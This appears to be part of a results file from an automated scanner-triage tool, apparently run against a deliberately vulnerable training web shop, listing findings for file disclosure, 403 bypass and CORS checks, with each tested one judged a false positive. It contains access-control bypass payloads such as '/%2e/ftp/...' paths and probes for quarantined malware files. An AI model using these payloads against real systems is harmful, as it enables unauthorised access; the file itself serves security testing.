+      "reason": "not a real disclosure (status=200, spa_shell=True)",
+      "proof": [],
+      "attempts": 1,
+      "elapsed_s": 0.31,
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "fetch",
+              "payload": "/ftp/quarantine%20-%20Copy%20(2)/juicy_malware_macos_64.url"
+            }
+          ],
+          "observed": {
+            "fetch": {
+              "status": 200,
+              "len": 9393
+            }
+          },
+          "oracle": "not a real disclosure (status=200, spa_shell=True)",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "10095:5",
+      "vuln_class": "file_disclosure",
+      "name": "Backup File Disclosure",
+      "verdict": "false_positive",
+      "reason": "not a real disclosure (status=200, spa_shell=True)",
+      "proof": [],
+      "attempts": 1,
+      "elapsed_s": 0.31,
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "fetch",
+              "payload": "/ftp/quarantine%20-%20Copy%20(2)/juicy_malware_windows_64.exe.url"
+            }
+          ],
+          "observed": {
+            "fetch": {
+              "status": 200,
+              "len": 9393
+            }
+          },
+          "oracle": "not a real disclosure (status=200, spa_shell=True)",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "10095:6",
+      "vuln_class": "file_disclosure",
+      "name": "Backup File Disclosure",
+      "verdict": "false_positive",
+      "reason": "not a real disclosure (status=200, spa_shell=True)",
+      "proof": [],
+      "attempts": 1,
+      "elapsed_s": 0.35,
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "fetch",
+              "payload": "/ftp/quarantine%20-%20Copy%20(3)"
+            }
+          ],
+          "observed": {
+            "fetch": {
+              "status": 200,
+              "len": 9393
+            }
+          },
+          "oracle": "not a real disclosure (status=200, spa_shell=True)",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "10095:7",
+      "vuln_class": "file_disclosure",
+      "name": "Backup File Disclosure",
+      "verdict": "false_positive",
+      "reason": "not a real disclosure (status=200, spa_shell=True)",
+      "proof": [],
+      "attempts": 1,
+      "elapsed_s": 0.34,
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "fetch",
+              "payload": "/ftp/quarantine%20-%20Copy%20(3)/juicy_malware_linux_amd_64.url"
+            }
+          ],
+          "observed": {
+            "fetch": {
+              "status": 200,
+              "len": 9393
+            }
+          },
+          "oracle": "not a real disclosure (status=200, spa_shell=True)",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "40038:0",
+      "vuln_class": "acl_bypass",
+      "name": "Bypassing 403",
+      "verdict": "false_positive",
+      "reason": "bypass did not return content (bypass=200)",
+      "proof": [],
+      "attempts": 1,
+      "elapsed_s": 0.37,
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "direct",
+              "payload": "/ftp/coupons_2013.md.bak"
+            },
+            {
+              "id": "bypass",
+              "payload": "/%2e/ftp/coupons_2013.md.bak"
+            }
+          ],
+          "observed": {
+            "direct": {
+              "status": 403,
+              "len": 1934
+            },
+            "bypass": {
+              "status": 200,
+              "len": 9393
+            }
+          },
+          "oracle": "bypass did not return content (bypass=200)",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "40038:1",
+      "vuln_class": "acl_bypass",
+      "name": "Bypassing 403",
+      "verdict": "false_positive",
+      "reason": "bypass did not return content (bypass=200)",
+      "proof": [],
+      "attempts": 1,
+      "elapsed_s": 0.31,
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "direct",
+              "payload": "/ftp/eastere.gg"
+            },
+            {
+              "id": "bypass",
+              "payload": "/%2e/ftp/eastere.gg"
+            }
+          ],
+          "observed": {
+            "direct": {
+              "status": 403,
+              "len": 1934
+            },
+            "bypass": {
+              "status": 200,
+              "len": 9393
+            }
+          },
+          "oracle": "bypass did not return content (bypass=200)",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "40038:2",
+      "vuln_class": "acl_bypass",
+      "name": "Bypassing 403",
+      "verdict": "false_positive",
+      "reason": "bypass did not return content (bypass=200)",
+      "proof": [],
+      "attempts": 1,
+      "elapsed_s": 0.32,
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "direct",
+              "payload": "/ftp/encrypt.pyc"
+            },
+            {
+              "id": "bypass",
+              "payload": "/%2e/ftp/encrypt.pyc"
+            }
+          ],
+          "observed": {
+            "direct": {
+              "status": 403,
+              "len": 1934
+            },
+            "bypass": {
+              "status": 200,
+              "len": 9393
+            }
+          },
+          "oracle": "bypass did not return content (bypass=200)",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "40038:3",
+      "vuln_class": "acl_bypass",
+      "name": "Bypassing 403",
+      "verdict": "false_positive",
+      "reason": "bypass did not return content (bypass=200)",
+      "proof": [],
+      "attempts": 1,
+      "elapsed_s": 0.32,
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "direct",
+              "payload": "/ftp/package-lock.json.bak"
+            },
+            {
+              "id": "bypass",
+              "payload": "/%2e/ftp/package-lock.json.bak"
+            }
+          ],
+          "observed": {
+            "direct": {
+              "status": 403,
+              "len": 1934
+            },
+            "bypass": {
+              "status": 200,
+              "len": 9393
+            }
+          },
+          "oracle": "bypass did not return content (bypass=200)",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "40038:4",
+      "vuln_class": "acl_bypass",
+      "name": "Bypassing 403",
+      "verdict": "false_positive",
+      "reason": "bypass did not return content (bypass=200)",
+      "proof": [],
+      "attempts": 1,
+      "elapsed_s": 0.33,
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "direct",
+              "payload": "/ftp/package.json.bak"
+            },
+            {
+              "id": "bypass",
+              "payload": "/%2e/ftp/package.json.bak"
+            }
+          ],
+          "observed": {
+            "direct": {
+              "status": 403,
+              "len": 1934
+            },
+            "bypass": {
+              "status": 200,
+              "len": 9393
+            }
+          },
+          "oracle": "bypass did not return content (bypass=200)",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "40038:5",
+      "vuln_class": "acl_bypass",
+      "name": "Bypassing 403",
+      "verdict": "false_positive",
+      "reason": "bypass did not return content (bypass=200)",
+      "proof": [],
+      "attempts": 1,
+      "elapsed_s": 0.29,
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "direct",
+              "payload": "/ftp/suspicious_errors.yml"
+            },
+            {
+              "id": "bypass",
+              "payload": "/%2e/ftp/suspicious_errors.yml"
+            }
+          ],
+          "observed": {
+            "direct": {
+              "status": 403,
+              "len": 1934
+            },
+            "bypass": {
+              "status": 200,
+              "len": 9393
+            }
+          },
+          "oracle": "bypass did not return content (bypass=200)",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "40040-2:0",
+      "vuln_class": "cors",
+      "name": "CORS Misconfiguration",
+      "verdict": "false_positive",
+      "reason": "origin not reflected (ACAO=*); not exploitable this way",
+      "proof": [],
+      "attempts": 1,
+      "elapsed_s": 0.3,
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "probe",
+              "payload": "/api/Feedbacks/"
+            }
+          ],
+          "observed": {
+            "probe": {
+              "status": 200,
+              "len": 1734
+            }
+          },
+          "oracle": "origin not reflected (ACAO=*); not exploitable this way",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "40040-2:1",
+      "vuln_class": "cors",
+      "name": "CORS Misconfiguration",
+      "verdict": "false_positive",
+      "reason": "origin not reflected (ACAO=*); not exploitable this way",
+      "proof": [],
+      "attempts": 1,
+      "elapsed_s": 0.36,
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "probe",
+              "payload": "/api/Quantitys/"
+            }
+          ],
+          "observed": {
+            "probe": {
+              "status": 200,
+              "len": 7628
+            }
+          },
+          "oracle": "origin not reflected (ACAO=*); not exploitable this way",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "40040-2:2",
+      "vuln_class": "cors",
+      "name": "CORS Misconfiguration",
+      "verdict": "false_positive",
+      "reason": "origin not reflected (ACAO=*); not exploitable this way",
+      "proof": [],
+      "attempts": 1,
+      "elapsed_s": 0.32,
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "probe",
+              "payload": "/api/SecurityQuestions/"
+            }
+          ],
+          "observed": {
+            "probe": {
+              "status": 200,
+              "len": 1934
+            }
+          },
+          "oracle": "origin not reflected (ACAO=*); not exploitable this way",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "40040-2:3",
+      "vuln_class": "cors",
+      "name": "CORS Misconfiguration",
+      "verdict": "false_positive",
+      "reason": "origin not reflected (ACAO=*); not exploitable this way",
+      "proof": [],
+      "attempts": 1,
+      "elapsed_s": 0.31,
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "probe",
+              "payload": "/rest/captcha/"
+            }
+          ],
+          "observed": {
+            "probe": {
+              "status": 200,
+              "len": 49
+            }
+          },
+          "oracle": "origin not reflected (ACAO=*); not exploitable this way",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "40040-2:4",
+      "vuln_class": "cors",
+      "name": "CORS Misconfiguration",
+      "verdict": "false_positive",
+      "reason": "origin not reflected (ACAO=*); not exploitable this way",
+      "proof": [],
+      "attempts": 1,
+      "elapsed_s": 0.35,
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "probe",
+              "payload": "/rest/memories/"
+            }
+          ],
+          "observed": {
+            "probe": {
+              "status": 200,
+              "len": 6134
+            }
+          },
+          "oracle": "origin not reflected (ACAO=*); not exploitable this way",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "10038-1:0",
+      "vuln_class": "unknown",
+      "name": "Content Security Policy (CSP) Header Not Set",
+      "verdict": "skipped",
+      "reason": "no playbook for this class",
+      "proof": [],
+      "attempts": 0,
+      "elapsed_s": 0.0,
+      "trace": []
+    },
+    {
+      "finding_id": "10038-1:1",
+      "vuln_class": "unknown",
+      "name": "Content Security Policy (CSP) Header Not Set",
+      "verdict": "skipped",
+      "reason": "no playbook for this class",
+      "proof": [],
+      "attempts": 0,
+      "elapsed_s": 0.0,
+      "trace": []
+    },
+    {
+      "finding_id": "10038-1:2",
+      "vuln_class": "unknown",
+      "name": "Content Security Policy (CSP) Header Not Set",
+      "verdict": "skipped",
+      "reason": "no playbook for this class",
+      "proof": [],
+      "attempts": 0,
+      "elapsed_s": 0.0,
+      "trace": []
+    },
+    {
+      "finding_id": "10038-1:3",
+      "vuln_class": "unknown",
+      "name": "Content Security Policy (CSP) Header Not Set",
+      "verdict": "skipped",
+      "reason": "no playbook for this class",
+      "proof": [],
+      "attempts": 0,
+      "elapsed_s": 0.0,
+      "trace": []
+    },
+    {
+      "finding_id": "10038-1:4",
+      "vuln_class": "unknown",
+      "name": "Content Security Policy (CSP) Header Not Set",
+      "verdict": "skipped",
+      "reason": "no playbook for this class",
+      "proof": [],
+      "attempts": 0,
+      "elapsed_s": 0.0,
+      "trace": []
+    },
+    {
+      "finding_id": "10098:1",
+      "vuln_class": "unknown",
+      "name": "Cross-Domain Misconfiguration",
+      "verdict": "skipped",
+      "reason": "no playbook for this class",
+      "proof": [],
+      "attempts": 0,
+      "elapsed_s": 0.0,
+      "trace": []
+    },
+    {
+      "finding_id": "10098:2",
+      "vuln_class": "unknown",
+      "name": "Cross-Domain Misconfiguration",
+      "verdict": "skipped",
+      "reason": "no playbook for this class",
+      "proof": [],
+      "attempts": 0,
+      "elapsed_s": 0.0,
+      "trace": []
+    },
+    {
+      "finding_id": "10098:3",
+      "vuln_class": "unknown",
+      "name": "Cross-Domain Misconfiguration",
+      "verdict": "skipped",
+      "reason": "no playbook for this class",
+      "proof": [],
+      "attempts": 0,
+      "elapsed_s": 0.0,
+      "trace": []
+    },
+    {
+      "finding_id": "40040-1:0",
+      "vuln_class": "cors",
+      "name": "CORS Header",
+      "verdict": "false_positive",
+      "reason": "origin not reflected (ACAO=http://localhost:4200); not exploitable this way",
+      "proof": [],
+      "attempts": 1,
+      "elapsed_s": 0.3,
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "probe",
+              "payload": "/socket.io/?EIO=4&transport=polling&t=Q0BJvxq&sid=zlXf6kM4Z6lA6BFSAAAK"
+            }
+          ],
+          "observed": {
+            "probe": {
+              "status": 400,
+              "len": 41
+            }
+          },
+          "oracle": "origin not reflected (ACAO=http://localhost:4200); not exploitable this way",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "40040-1:1",
+      "vuln_class": "cors",
+      "name": "CORS Header",
+      "verdict": "false_positive",
+      "reason": "origin not reflected (ACAO=http://localhost:4200); not exploitable this way",
+      "proof": [],
+      "attempts": 1,
+      "elapsed_s": 0.29,
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "probe",
+              "payload": "/socket.io/?EIO=4&transport=polling&t=Q0BJvLd"
+            }
+          ],
+          "observed": {
+            "probe": {
+              "status": 200,
+              "len": 96
+            }
+          },
+          "oracle": "origin not reflected (ACAO=http://localhost:4200); not exploitable this way",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "40040-1:2",
+      "vuln_class": "cors",
+      "name": "CORS Header",
+      "verdict": "false_positive",
+      "reason": "origin not reflected (ACAO=http://localhost:4200); not exploitable this way",
+      "proof": [],
+      "attempts": 1,
+      "elapsed_s": 0.29,
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "probe",
+              "payload": "/socket.io/?EIO=4&transport=polling&t=Q0BJvbT&sid=zlXf6kM4Z6lA6BFSAAAK"
+            }
+          ],
+          "observed": {
+            "probe": {
+              "status": 400,
+              "len": 41
+            }
+          },
+          "oracle": "origin not reflected (ACAO=http://localhost:4200); not exploitable this way",
+          "verdict": "false_positive"
+        }
+      ]
+    }
+  ]
+}
